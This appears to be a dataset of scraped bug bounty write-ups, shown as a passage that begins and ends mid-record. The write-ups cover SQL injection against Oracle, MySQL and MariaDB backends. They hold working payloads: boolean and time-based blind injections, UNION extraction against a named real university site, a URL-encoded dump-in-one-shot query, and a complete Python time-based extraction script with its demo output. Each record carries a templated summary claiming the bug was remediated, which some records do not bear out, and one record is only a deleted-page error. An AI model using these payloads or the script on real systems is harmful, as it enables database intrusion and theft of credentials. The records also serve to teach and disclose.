pg_shadow table. Press enter or click to view image in full size Press enter or click to view image in full size Hope You liked this finding and i apologize for if there is any mistakes in this post. ☺ reference : https://medium.com/@cryptocracker99/a-penetration-testers-guide-to-postgresql-d78954921ee9 Postgres Bug Bounty Remote Code Execution Hacking Responsible Disclosure -- -- 2 Written by vishnuraj 711 followers · 74 following | OSCP | OSWE | eWPTXv2 | https://bugcrowd.com/vishnuraj Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://blog.yappare.com/2020/04/tricky-oracle-sql-injection-situation.html", "title": "Tricky Oracle SQL Injection Situation ~ Random stuff by yappare", "friendly_explanation": "This is a bug bounty writeup from https://blog.yappare.com/2020/04/tricky-oracle-sql-injection-situation.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nTricky Oracle SQL Injection Situation ~ Random stuff by yappare Skip to content Random stuff by yappare Menu Home Search for: Yeah..it is random.. Thursday, April 16, 2020 Tricky Oracle SQL Injection Situation on April 16, 2020 in BugBounty , Security , SQLi , Tricks No comments Recently I learnt few new stuff when solving SQL Injection found during pentest and also bugbounty. One of the new technique that seems new to me is the one that I learnt from my master, pokleyzz. This injection was found in a recent bugbounty program and the actual path/parameter were replaced. The injection was found on the \"idNumber\" parameter of the following endpoint /foo/?theName=YAP&idNumber=248001[here] Common payloads were performed on this target and initially, I found the following payloads were working to identify TRUE / FALSE condition /foo/?theName=YAP&idNumber=248001'+AND+'1'='1 TRUE /foo/?theName=YAP&idNumber=248001'+AND+'2'='1 FALSE and also able to use pipe operator too /foo/?theName=YAP&idNumber=248'||'001 TRUE /foo/?theName=YAP&idNumber=24'||'8'||'001 TRUE /foo/?theName=YAP&idNumber=24'||'X'||'001 FALSE With these conditions, I was able to narrow down the database used by this application to Oracle , PosgreSQL , IBM DB2 or Informix . At first, I thought this can be done using the same technique that I know: See : https://blog.yappare.com/2012/04/advance-oracle-blind-sql-injection.html However, the CASE() was not working. After few attempts, I stopped to figure out on using CASE() . Next, this technique was tried: See: https://blog.yappare.com/2017/03/blind-sql-injection-in-erim-not-sure.html No joy. Dead end. After almost two days of trying, I give up doing it myself and ask helps from few friends. No luck. I tried my last option, pokleyzz. In just less than an hour, he showed me the technique that can be used. /foo/?theName=YAP&idNumber=248'||<bruteforce any known SQL functions here>||'001 As a result, I found \" rownum \" was accepted and this indicates the DBMS is Oracle . To reconfirm, the following was queried: /foo/?theName=YAP&idNumber=24800'||rownum||' The above payload result in the website displayed list of \" theName \" product that starts with \" idNumber \" 24800 Interesting! Now how we can at least extract data from this injection? Another blocker was identified. It seems the application filtered/replaced the following characters _ ( ) + . whitespaces While I found this seems another dead end, pokleyzz showed another brilliant way to extract the data using the following payload: /foo/?theName=YAP&idNumber=248'||<bruteforce all column_name here>||'001 - We found few column names which one of it was \"username\" Then final step was: /foo/?theName=YAP&idNumber=248001'and''||username||''like'<bruteforce-character>% I ran the Intruder on the above attacking point and voila, got the username 😼 As always, pokleyzz is the best master I have. 💻 Bye. Share: Email This BlogThis! Share to X Share to Facebook Newer Post Older Post Home 0 comments: Post a Comment Text Widget Home Popular Posts BUG-000114489 : SSRF in Portal for ArcGIS Leaking NTLMv2 Hashes This was found and responsibly disclosed to the ArcGIS team last year. Issue was given BUG id 000114489 and patch has been released. T... Tricky Oracle SQL Injection Situation Recently I learnt few new stuff when solving SQL Injection found during pentest and also bugbounty. One of the new technique that seems new... Pages Home Blog Archive ► 2024 (1) ► March (1) ▼ 2020 (2) ► October (1) ▼ April (1) Tricky Oracle SQL Injection Situation ► 2019 (3) ► February (2) ► January (1) ► 2018 (1) ► January (1) ► 2017 (3) ► August (1) ► June (1) ► March (1) ► 2016 (5) ► December (1) ► April (1) ► February (1) ► January (2) ► 2015 (2) ► October (1) ► February (1) ► 2014 (6) ► December (1) ► November (1) ► August (1) ► June (1) ► February (1) ► January (1) ► 2013 (23) ► December (1) ► November (1) ► September (1) ► August (1) ► June (4) ► May (1) ► April (7) ► March (2) ► February (3) ► January (2) ► 2012 (23) ► December (1) ► November (5) ► October (3) ► September (3) ► August (3) ► July (2) ► June (1) ► May (2) ► April (1) ► January (2) ► 2011 (71) ► December (1) ► November (2) ► October (3) ► August (5) ► July (5) ► June (4) ► May (6) ► April (6) ► March (18) ► February (16) ► January (5) ► 2010 (18) ► December (12) ► November (5) ► September (1) Recent Posts Unordered List Categories 2014 (1) BugBounty (16) CTF (11) debian (1) Hall of Fame (21) Linux (1) parrotOS (1) python (1) Security (48) SQLi (22) Tricks (31) Troubleshooting (2) utp (1) UTPHAX (1) Wargames (12) XPS (1) XSS (26) Twitter Facebook GooglePlus Pinterest Linkedin Instagram Flickr Youtube Vimeo Github Tumblr Digg Stumbleupon Reddit Dribbble RSS Copyright © Random stuff by yappare | Powered by Blogger Design by Themehaus | Blogger Theme by NewBloggerThemes.com"}
{"source_url": "https://medium.com/@logicbomb_1/bugbounty-database-hacked-of-indias-popular-sports-company-bypassing-host-header-to-sql-7b9af997c610", "title": "#BugBounty —” Database hacked of India’s Popular Sports company”-Bypassing Host Header to SQL injection to dumping Database — An unusual case of SQL injection. | by Avinash Jain (@logicbomb) | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@logicbomb_1/bugbounty-database-hacked-of-indias-popular-sports-company-bypassing-host-header-to-sql-7b9af997c610. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n#BugBounty —” Database hacked of India’s Popular Sports company”-Bypassing Host Header to SQL injection to dumping Database — An unusual case of SQL injection. | by Avinash Jain (@logicbomb) | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in #BugBounty —” Database hacked of India’s Popular Sports company”-Bypassing Host Header to SQL injection to dumping Database — An unusual case of SQL injection. Avinash Jain (@logicbomb) 4 min read · Jun 6, 2018 -- 7 Listen Share Hi Guys, One more interesting blog , one more interesting vulnerability that I managed to found out during my bugbounty hunt and it comes in India’s popular sports website and this is about “ How I was able to exploit Host Header to find out SQL injection, bypassing rule using sqlmap tamper script and later on dump the database ” . Let’s see what was the complete scenario — While checking the application for bruteforce OTP vulnerability , I run the burp intruder on the site and found that my IP got blocked and I could see the error message thrown from which I could figure out that application was over AWS. Further I found that “X-Amz-Cf-Id” header set in HTTP response (which CloudFront adds to the viewer request before forwarding the request to the origin) - Press enter or click to view image in full size Cloudfront header and this was enough for me to decide that application is running over AWS. Now before directly jumping to check for some critical vulnerability, I always start from low hanging fruits (just to increase the list of vulnerabilities :) ) so I started with Host header attack , changed the host header value but it didn’t work. As I knew that application is over AWS so they must using ELB (elastic load balancer) so I tried the host header attack using X-Forwarded-Host header as below — Press enter or click to view image in full size Added X-Forwarded-host header Added X-Forwarded-Host header , set it to value to www.google.com and I got 302 redirection to google.com but when I set the value to www.evil.com , I got the below response- Press enter or click to view image in full size HTTP 403 Forbidden HTTP Forbidden with status code 403 and now something striked my mind. As it was clear that the application backend server must be having some whitelisting of host values (as it has allowed google.com but denied evil.com), now there are two possibilities either some script is checking it against array/list of allowed values or if they are storing the values in the database then there may be a Database lookup. So just to check the same , I tried some sql queries against the value of X-Forwarded-Host and this is what I got — Time based SQL Injection in X-Forwarded-Host header As you can see in the above screenshot, I gave a sql query with the sleep() of 10sec and time it took for HTTP response is 9.4sec. and yes , an unusual case of SQL injection in X-Forwarded-Host header :) and then the next task was to extract some DB content and as most usually I ran sqlmap over the vulnerable parameter and found that connection was getting refused , I decided to add the time delay to throttle HTTP requests and increase the connection timeout (--delay=DELAY --timeout=TIMEOUT and waited for some time but still I faced the same issue , might be some blacklisting of characters. To quickly check this , I entered “<script>alert(1)</script>” in the X-Forwarded-Host header and got the response with HTTP STATUS 400 — BAD REQUEST ERROR The thing was pretty much clear, script tags, <,> character was blacklisted . SQLMAP provide tamper script — between.py to replace symbols (<,>) with “NOT BETWEEN”. So I included it in the sqlmap query , ran it and after some time I ended with the complete database of the enterprise containing sample level user credentials , email-ids and lots of more data — (For Proof of Concept) Press enter or click to view image in full size Database Data and this is how I was able to found an unusual case of SQL injection by bypassing Host header attack using X-Forwarded-Host in India’s Popular Sports company. Report details- 03-May-2018 — Bug reported to the concerned company. 03-May-2018 — Bug was marked fixed. 03-May-2018 — Re-tested and confirmed the fix 05-May-2018- Rewarded by the company. Thanks for reading! ~Logicbomb ( https://twitter.com/logicbomb_1 ) More where this came from This story is published in Noteworthy , where thousands come every day to learn about the people & ideas shaping the products we love. Follow our publication to see more product & design stories featured by the Journal team. Security Hacking Ethical Hacking Penetration Testing Information Security -- -- 7 Written by Avinash Jain (@logicbomb) 4.99K followers · 230 following Security Engineer @Microsoft | DevSecOps | Speaker | Breaking stuff to learn | Featured in Forbes, BBC| Acknowledged by Google, NASA, Yahoo, UN etc Responses ( 7 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@adeshkolte/sql-injection-vulnerability-in-university-of-cambridge-b4c8d0381e1", "title": "SQL Injection Vulnerability In University Of Cambridge | by Adesh Kolte | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@adeshkolte/sql-injection-vulnerability-in-university-of-cambridge-b4c8d0381e1. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSQL Injection Vulnerability In University Of Cambridge | by Adesh Kolte | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Adesh Kolte 4 min read · Aug 24, 2018 -- 2 Listen Share SQL Injection Vulnerability In University Of Cambridge Hello Introduction Of Author: I am Adesh Nandkishor Kolte ,An Independent Security Resercher From India Found a SQL Injection Vulnerability in University Of Cambridge Press enter or click to view image in full size This is the most prevalent and most dangerous of web application vulnerabilities. Having this SQLi vulnerability in the application, an attacker may cause severe damage such as bypassing logins, retrieving sensitive information, modifying, deleting data. Sometimes this costs life when it comes to Healthcare, Banking domains. Okay introduction apart, the objective of this article is to exploit and read some sensitive data from the database. If you don’t know what exactly is this SQLi then read my other article which may throw some light. I am splitting the subject into two parts, having everything in one might throw you out of interest. Identifying the vulnerable site! I tried the most basic check for SQL vulnerability by inserting an apostrophe (‘) in the username field and leaving the password field empty and trying to login, after a few attempts this website gave me an SQL error which looked something like this. Now, lets get started. Launch your Target select SQL injection GET/Search. Our Target URL : https://www.hki.fitzmuseum.cam.ac.uk/archives/winsor-and-newton/search.php?pid=Search&s_arg=Boutin&opt[]=named_individuals_sum ’ Press enter or click to view image in full size Fixing The Error So I tried Some tricks for fixing this error which occur when i entered the single quote (‘) Like that https://www.hki.fitzmuseum.cam.ac.uk/archives/winsor-and-newton/search.php?pid=Search&s_arg=Boutin&opt[]=named_individuals_sum ’ — + https://www.hki.fitzmuseum.cam.ac.uk/archives/winsor-and-newton/search.php?pid=Search&s_arg=Boutin&opt[]=named_individuals_sum ’ — - https://www.hki.fitzmuseum.cam.ac.uk/archives/winsor-and-newton/search.php?pid=Search&s_arg=Boutin&opt[]=’named_individuals_sum ’ — +(worked :) Fixed The error ) Press enter or click to view image in full size Finding Columns Using Order By or Group By Order By Clause in My SQL The SQL ORDER BY clause is used to sort the data in ascending or descending order, based on one or more columns. Some databases sort the query results in an ascending order by default. Group By Clause in My SQL The SQL GROUP BY clause is used in collaboration with the SELECT statement to arrange identical data into groups. This GROUP BY clause follows the WHERE clause in a SELECT statement and precedes the ORDER BY clause. For finding the Column here i used order by clause https://www.hki.fitzmuseum.cam.ac.uk/archives/winsor-and-newton/search.php?pid=Search&s_arg=Boutin&opt[]=’named_individuals_sum ’ order by 16 — + Press enter or click to view image in full size so i tried order by 15 — + here https://www.hki.fitzmuseum.cam.ac.uk/archives/winsor-and-newton/search.php?pid=Search&s_arg=Boutin&opt[]=’named_individuals_sum ’ order by 1 5— + Press enter or click to view image in full size Site Loaded Normally so this website have 15 columns Finding Vulnerable Column From 15 Columns For finding vulnerable Column i have to use the keyword in MYSQL UNION SELECT What is the use of Union Clause in My SQL? The SQL UNION clause/operator is used to combine the results of two or more SELECT statements without returning any duplicate rows What is SELECT Statement ? The SQL SELECT statement is used to fetch the data from a database table which returns this data in the form of a result table. These result tables are called result-sets. — — — — — — Syntax The basic syntax of the UNION SELECT statement is as follows UNION SELECT column1, column2, columnN FROM table_name; http://webapps.fitzmuseum.cam.ac.uk/wn/search.php?pid=Search&s_arg=Boutin&opt[]=’named_individuals_sum’ union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--+ Press enter or click to view image in full size Getting Required Data Finding Version, User and Database name SQL provide function for that For example version(),User() and database() Version() http://webapps.fitzmuseum.cam.ac.uk/wn/search.php?pid=Search&s_arg=Boutin&opt[]=%27named_individuals_sum%27%20union%20select%201,version(),3,4,5,6,7,8,9,10,11,12,13,14,15--+ Output: 5.1.39-community Press enter or click to view image in full size User() http://webapps.fitzmuseum.cam.ac.uk/wn/search.php?pid=Search&s_arg=Boutin&opt[]=%27named_individuals_sum%27%20union%20select%201,user(),3,4,5,6,7,8,9,10,11,12,13,14,15--+ output: root@koala.fitzmuseum.cam.ac.uk Press enter or click to view image in full size Database() http://webapps.fitzmuseum.cam.ac.uk/wn/search.php?pid=Search&s_arg=Boutin&opt[]=%27named_individuals_sum%27%20union%20select%201,database(),3,4,5,6,7,8,9,10,11,12,13,14,15--+ Output: wn_index Press enter or click to view image in full size Video Demonstration: https://youtu.be/tK88xAwuF2w I reported last week and vulnerability Fixed :) I hope you like the Article Thanks for Reading and Happy Hunting :) Programming Infosec Cybersecurity Bug Bounty -- -- 2 Written by Adesh Kolte 647 followers · 143 following Listed in Top 100 most respected hackers in the world by Microsoft at the BlackHat conference in America 2018 Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@nuraalamdipu/union-based-sql-injection-write-up-a-private-company-site-273f89a49ed9", "title": "Union Based Sql injection Write up ->A private Company Site | by Nur A Alam Dipu | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@nuraalamdipu/union-based-sql-injection-write-up-a-private-company-site-273f89a49ed9. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nUnion Based Sql injection Write up ->A private Company Site | by Nur A Alam Dipu | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Union Based Sql injection Write up ->A private Company Site Nur A Alam Dipu 4 min read · Mar 12, 2018 -- 4 Listen Share Hello everyone, This is my first blogpost writeup and I am very excited to share this. Few days ago I’ve tested a private site, I used the site name like “site.com”. The company provide services via ip address. I dont know about their full service details. I just check bugs my regular testing way in their userpanel. While testing I found some issues, like clickjacking, open redirection, and xss also. After reported multiple bugs via mail ask them about update process they said, Then I asked them about bounty, They said, Press enter or click to view image in full size I was disappointed to see their reply. I thought may be they consider the xss issues. But they don’t accept any bug for bounty without sql injection. :( In this time they already fixed the issues. But that time I was in vacation and spent time without my pc. So I can’t check any sql injection that time. I was dissapointed but my mind was thinking there’s must be a point to do sqli. After fews days I back my work and start finding all endpoints. So, for finding any parameters I normally used auckentix. I dont like to use any tool, but sometimes it helps. I just start searching many parameters but no params is vulnerable. Finally I found a parameter that is vulnerable to “ union based injection ” i was happy but can’t find any vulnerable column. In this mean time I found a Another parameter like https://site.com/ress/xx-list/os-detail?os=xxxxxxxxx . This parameter is sqli vulnerable also. Then try my all sql injection learning tricks. First I fix the query in a normal process. I try with “union based” https://site.com/xxxxx/xxxx-list/os-detail?os=xxxxx'--+ (query fixed) https://site.com/ xxxxx /xxxx-list/os-detail?os=xxxxx' order by 1 — + (ok) https://site.com/ xxxxx /xxxx-list/os-detail?os=xxxxx' order by 15 — + (error) https://site.com/ xxxxx /xxxx-list/os-detail?os=xxxxx' order by 11 — + (ok) there is 11 columns :) Previous endpoint had 14 columns but no vulnerable column. https://site.com/ xxxxx /xxxx-list/os-detail?os=xxxxx' +UNION(SELECT(1),(2),(3),(4),(5),(6),(7),(8),(9),(10),(11)) — + Got the vulnerable point. Vulnerable column was 2,3,4,8. Then I try to print DB,version, OS, port and all others in the front page. This is now easy task to do other parts. https://site.com/ xxxxx /xxxx-list/os-detail?os=-xxxxx' Union Select 1,Concat(0x3c666f6e7420636f6c6f723d7265642073697a653d343e,’Injected by dipu’,0x3c62723e,’ version : ‘,@@version,0x3c62723e,’ DB : ‘,database(),0x3c62723e,’User : ‘,user(),0x3c62723e,’OS : ‘,@@VERSION_COMPILE_OS,0x3c62723e,’SSL : ‘,@@HAVE_OPENSSL,0x3c62723e,’Port : ‘,@@PORT ),3,4,5,6,7,8,9,10,11 — + Press enter or click to view image in full size Then I try to print tables schema, https://site.com/ xxxxx /xxxx-list/os-detail?os=-xxxxx' Union Select 1,Concat(0x3c666f6e7420636f6c6f723d7265642073697a653d343e,’Injected by dipu’,0x3c62723e,’ version : ‘,@@version,0x3c62723e,’ DB : ‘,database(),0x3c62723e,’User : ‘,user(),0x3c62723e,’OS : ‘,@@VERSION_COMPILE_OS,0x3c62723e,’SSL : ‘,@@HAVE_OPENSSL,0x3c62723e,’Port : ‘,@@PORT ),(select Group_Concat(0x3c62723e,table_name) from information_schema.tables where table_schema),4,5,6,7,8,9,10,11 — + Tables Schema printed. https://site.com/ xxxxx /xxxx-list/os-detail?os=-xxxxx' Union Select 1,Concat(0x3c666f6e7420636f6c6f723d7265642073697a653d343e,’Injected by dipu’,0x3c62723e,’ version : ‘,@@version,0x3c62723e,’ DB : ‘,database(),0x3c62723e,’User : ‘,user(),0x3c62723e,’OS : ‘,@@VERSION_COMPILE_OS,0x3c62723e,’SSL : ‘,@@HAVE_OPENSSL,0x3c62723e,’Port : ‘,@@PORT ),(select Group_Concat(0x3c62723e,table_name,0x3a3a,column_name) from information_schema.columns where table_schema=database()),4,5,6,7,8,9,10,11 — + But I got a problem there to print full table via union select query. (select Group_Concat(0x3c62723e,table_name,0x3a3a,column_name) from information_schema.columns where table_schema = database()) the problem was ‘=’. I remembered,there is a way to bypass this equal sing. Just a simple bypass “=” change to like (select Group_Concat(0x3c62723e,table_name,0x3a3a,column_name) from information_schema.columns where table_schema like database()) Then Full table was printed. Then do dios. But dios not work. zen,makman, sharik no dios worked. I just encoded the query and printed the whole table with columns. I was shocked to see the info. :D Just in one word I can say, everything was there. Full query with dios, https://site.com/xxxx/xxx-list/os-detail?os=-xxxxx' Union Select 1,Concat(0x3c666f6e7420636f6c6f723d7265642073697a653d323e,’Injected by dipu’,0x3c62723e,’ version : ‘,@@version,0x3c62723e,’ DB : ‘,database(),0x3c62723e,’User : ‘,user(),0x3c62723e,’OS : ‘,@@VERSION_COMPILE_OS,0x3c62723e,’SSL : ‘,@@HAVE_OPENSSL,0x3c62723e,’Port : ‘,@@PORT ),3,4,5,6,7,8,%28%53%65%6c%65%63%74%20%65%78%70%6f%72%74%5f%73%65%74%28%35%2c%40%3a%3d%30%2c%28%73%65%6c%65%63%74%20%63%6f%75%6e%74%28%2a%29%66%72%6f%6d%28%69%6e%66%6f%72%6d%61%74%69%6f%6e%5f%73%63%68%65%6d%61%2e%63%6f%6c%75%6d%6e%73%29%77%68%65%72%65%40%3a%3d%65%78%70%6f%72%74%5f%73%65%74%28%35%2c%65%78%70%6f%72%74%5f%73%65%74%28%35%2c%40%2c%74%61%62%6c%65%5f%6e%61%6d%65%2c%30%78%33%63%36%63%36%39%33%65%2c%32%29%2c%63%6f%6c%75%6d%6e%5f%6e%61%6d%65%2c%30%78%61%33%61%2c%32%29%29%2c%40%2c%32%29%29,10,11 — + I have reported them and they give reply so quick, they trun off the site and said, Normally I dont check any sqli in big sites, cause its hard to find. But this finding inspire me to do more like this. Its true if they dont ask about sqli I didn’t try. :3 Hope you Like my first write up. Sorry for my mistakes and bad english. Thanks for reading. :) Programming Bug Bounty Sql Injection -- -- 4 Written by Nur A Alam Dipu 347 followers · 88 following Responses ( 4 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/bugbountywriteup/a-five-minute-sql-i-16ab75b20fe4", "title": "410 Deleted by author — Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/a-five-minute-sql-i-16ab75b20fe4. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\n410 Deleted by author — Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Error 410 The author deleted this Medium story."}
{"source_url": "https://blog.redforce.io/sql-injection-in-insert-update-query-without-comma/", "title": "Comma is forbidden! No worries!! Inject in insert/update queries without it – Redforce", "friendly_explanation": "This is a bug bounty writeup from https://blog.redforce.io/sql-injection-in-insert-update-query-without-comma/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nComma is forbidden! No worries!! Inject in insert/update queries without it – Redforce Always Stay Ahead! Home Categories Web Security Mobile pentest About us About us Our team Our services Get in! Share stories that are meaningful to you and connect with your audiences. Click to sign in/sign up Web Security • March 31, 2019 • 13 min read Comma is forbidden! No worries!! Inject in insert/update queries without it A writeup regarding exploiting SQL injection issue in an insert query while it wasn’t possible to use a comma at my payload at all. 35 0 Tweet Share TL;DR This blog post is about the exploitation of one of the interesting SQL injection issues I found during bug hunting. The interesting part was the exploitation, the vulnerable endpoint was using insert query and I wasn’t able to use commas due to the application’s logic. After some search, I successfully exploited the issue using the following payload xxx'-cast((select CASE WHEN ((MY_QUERY) like 'CHAR_TO_BRUTE_FORCE%25') THEN (sleep(1)) ELSE 2 END) as char)-' as a base for my exploit code, reported it and gained 10,000$ for that one. An unnecessary introduction Injection in the update or insert queries is known since a long time ago. As in any SQL injection issue, the problem arises from using unsanitized input before passing it to the SQL query. Dummy example $email=$_POST['email']; $name=$_POST['name']; $review=$_POST['review']; $query=\"insert into reviews(review,email,name) values ('$review','$email','$name')\"; mysql_query($query,$conn); A normal request such as review=test review& [email protected] &name=test name will result in the following SQL query insert into reviews(review,email,name) values ('test review',' [email protected] ','test name'); Selecting that column will result in MariaDB [dummydb]> insert into reviews(review,email,name) values ('test review',' [email protected] ','test name'); Query OK, 1 row affected (0.001 sec) MariaDB [dummydb]> select * from reviews; +-------------+------------------+-----------+ | review | email | name | +-------------+------------------+-----------+ | test review | [email protected] | test name | +-------------+------------------+-----------+ 1 row in set (0.000 sec) So to exploit the issue we have multiple options, Exploiting it as an error based injection setting any parameter to test review' and extractvalue(0x0a,concat(0x0a,(select database()))) and '1 This will result in a SQL error disclosing the DBname MariaDB [dummydb]> insert into reviews(review,email,name) values ('test review' and extractvalue(0x0a,concat(0x0a,(select database()))) and '1',' [email protected] ','test name'); ERROR 1105 (HY000): XPATH syntax error: ' dummydb' Using subqueries In case the SQL errors were being handled we may use subqueries to execute our SQL query, write the output into any column and read it later. Example: setting the review parameter’s value to jnk review',(select user()),'dummy name')-- - Will result in making the query looks like insert into reviews(review,email,name) values ('jnk review',(select user()),'dummy name')-- -,' [email protected] ','test name'); so the following part ,' [email protected] ','test name'); Will be ignored and the Email value will just become the output of the (select user()) query MariaDB [dummydb]> insert into reviews(review,email,name) values ('jnk review',(select user()),'dummy name');--,' [email protected] ','test name'); Query OK, 1 row affected (0.001 sec) MariaDB [dummydb]> select * from reviews; +-------------+------------------+------------+ | review | email | name | +-------------+------------------+------------+ | test review | [email protected] | test name | | jnk review | root@localhost | dummy name | +-------------+------------------+------------+ 2 rows in set (0.000 sec) MariaDB [dummydb]> Straight forward and so easy. Exploitation using blind injection In case there is no error being thrown, being unable to view the data we just inserted or even there were no way to indicate whether if our query resulted in a true or false condition, we can move to the time-based injection, this can be easily done using the following payload xxx'-(IF((substring((select database()),1,1)) = 'd', sleep(5), 0))-'xxxx If the query output is true, the DBMS will sleep for 5 seconds, using that technique we can obtain the data needed from the DB. Quick reference: https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/ The problem So, overall exploiting such issue isn’t a big deal, But the scenario in that specific bug was different. The vulnerable parameters, urls[] and methods[] were getting split by “ , ” which made it obvious to me after few tries that I won’t be able to use a comma at the exploitation scenario by any mean. pseudo example $urls_input=$_POST['urls']; $urls = explode(\",\", $urls_input); print_r($urls); foreach($urls as $url){ mysql_query(\"insert into xxxxxx (url,method) values ('$url','method')\") } So based on the previous piece of code if we set the urls parameter to xxx'-(IF((substring((select database()),1,1)) = 'd', sleep(5), 0))-'xxxx The input will be split and converted into Array ( [0] => xxx'-(IF((substring((select database()) [1] => 1 [2] => 1)) = 'd' [3] => sleep(5) [4] => 0))-'xxxx ) Which is totally meaningless when being handled by the SQL server The solution So the solution should include a payload which doesn’t contain a comma at all. So the 1st step is finding a replace the IF condition which requires commas to work with another alternative suitable to our case. The case when statement was just perfect for that The CASE statement goes through conditions and return a value when the first condition is met (like an IF-THEN-ELSE statement). So, once a condition is true, it will stop reading and return the result. If no conditions are true, it will return the value in the ELSE clause. If there is no ELSE part and no conditions are true, it returns NULL. basic usage is MariaDB [dummydb]> select CASE WHEN ((select substring('111',1,1)='1')) THEN (sleep(3)) ELSE 2 END; +--------------------------------------------------------------------------+ | CASE WHEN ((select substring('111',1,1)='1')) THEN (sleep(3)) ELSE 2 END | +--------------------------------------------------------------------------+ | 0 | +--------------------------------------------------------------------------+ 1 row in set (3.001 sec) This will sleep for 3 seconds if the condition is true. The 2nd step is finding an alternative the substring , that’s relatively easy, we may use like operator to achieve that Basic example MariaDB [dummydb]> select CASE WHEN ((select database()) like 'd%') THEN (sleep(3)) ELSE 2 END; +----------------------------------------------------------------------+ | CASE WHEN ((select database()) like 'd%') THEN (sleep(3)) ELSE 2 END | +----------------------------------------------------------------------+ | 0 | +----------------------------------------------------------------------+ 1 row in set (3.001 sec) This will sleep 3 seconds if the 1st char of the (select database()) query equal to the character ‘ d ‘. The last step is to concatenate this query along with the insert one. For some reason, the direct concatenation in the form of http://xxxxxxxx/'-(select CASE WHEN ((select database()) like 'd%') THEN (sleep(4)) ELSE 2 END)-'xxx Didn’t work on the target’s side, I had to cast the case when as char to overcome that so the full payload became urls[]=xxx'-cast((select CASE WHEN ((MY_QUERY) like 'CHAR_TO_BRUTE_FORCE%25') THEN (sleep(1)) ELSE 2 END) as char)-' Exploitation That would be so exhausting to exploit manually so I wrote a simple script to automate the data extraction process import requests import sys import time # xxxxxxxxxexample.com SQLi POC # Coded by Ahmed Sultan (0x4148) if len(sys.argv) == 1: print ''' Usage : python sql.py \"QUERY\" Example : python sql.py \"(select database)\" ''' sys.exit() query=sys.argv[1] print \"[*] Obtaining length\" url = \"https://xxxxxxxxxexample.com:443/sub\" headers = {\"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Cookie\": 'xxxxxxxxxxxxxxxxxxx', \"Referer\": \"https://www.xxxxxxxxxexample.com:443/\", \"Host\": \"www.xxxxxxxxxexample.com\", \"Connection\": \"close\", \"X-Requested-With\":\"XMLHttpRequest\", \"Content-Type\": \"application/x-www-form-urlencoded\"} for i in range(1,100): current_time=time.time() data={\"methods[]\": \"on-site\", \"urls[]\": \"jnkfooo'-cast((select CASE WHEN ((select length(\"+query+\"))=\"+str(i)+\") THEN (sleep(1)) ELSE 2 END) as char)-'\"} response=requests.post(url, headers=headers, data=data).text response_time=time.time() time_taken=response_time-current_time print \"Executing jnkfooo'-cast((select CASE WHEN ((select length(\"+query+\"))=\"+str(i)+\") THEN (sleep(1)) ELSE 2 END) as char)-'\"+\" took \"+str(time_taken) if time_taken > 2: print \"[+] Length of DB query output is : \"+str(i) length=i+1 break i=i+1 print \"[*] obtaining query output\\n\" outp='' #Obtaining query output charset=\"abcdefghijklmnopqrstuvwxyz0123456789.ABCDEFGHIJKLMNOPQRSTUVWXYZ_@-.\" for i in range(1,length): for char in charset: current_time=time.time() data={\"methods[]\": \"on-site\", \"urls[]\": \"jnkfooo'-cast((select CASE WHEN (\"+query+\" like '\"+outp+char+\"%') THEN (sleep(1)) ELSE 2 END) as char)-'\"} response=requests.post(url, headers=headers, data=data).text response_time=time.time() time_taken=response_time-current_time print \"Executing jnkfooo'-cast((select CASE WHEN (\"+query+\" like '\"+outp+char+\"%') THEN (sleep(1)) ELSE 2 END) as char)-' took \"+str(time_taken) if time_taken > 2: print \"Got '\"+char+\"'\" outp=outp+char break i=i+1 print \"QUERY output : \"+outp Demo usage [19:38:36] root:/tmp # python sql7.py '(select \"abc\")' [*] Obtaining length Executing jnkfooo'-cast((select CASE WHEN ((select length((select \"abc\")))=1) THEN (sleep(1)) ELSE 2 END) as char)-' took 0.538205862045 Executing jnkfooo'-cast((select CASE WHEN ((select length((select \"abc\")))=2) THEN (sleep(1)) ELSE 2 END) as char)-' took 0.531971931458 Executing jnkfooo'-cast((select CASE WHEN ((select length((select \"abc\")))=3) THEN (sleep(1)) ELSE 2 END) as char)-' took 5.55048894882 [+] Length of DB query output is : 3 [*] obtaining query output Executing jnkfooo'-cast((select CASE WHEN ((select \"abc\") like 'a%') THEN (sleep(1)) ELSE 2 END) as char)-' took 5.5701880455 Got 'a' Executing jnkfooo'-cast((select CASE WHEN ((select \"abc\") like 'aa%') THEN (sleep(1)) ELSE 2 END) as char)-' took 0.635061979294 Executing jnkfooo'-cast((select CASE WHEN ((select \"abc\") like 'ab%') THEN (sleep(1)) ELSE 2 END) as char)-' took 5.61513400078 Got 'b' Executing jnkfooo'-cast((select CASE WHEN ((select \"abc\") like 'aba%') THEN (sleep(1)) ELSE 2 END) as char)-' took 0.565879821777 Executing jnkfooo'-cast((select CASE WHEN ((select \"abc\") like 'abb%') THEN (sleep(1)) ELSE 2 END) as char)-' took 0.553005933762 Executing jnkfooo'-cast((select CASE WHEN ((select \"abc\") like 'abc%') THEN (sleep(1)) ELSE 2 END) as char)-' took 5.6208281517 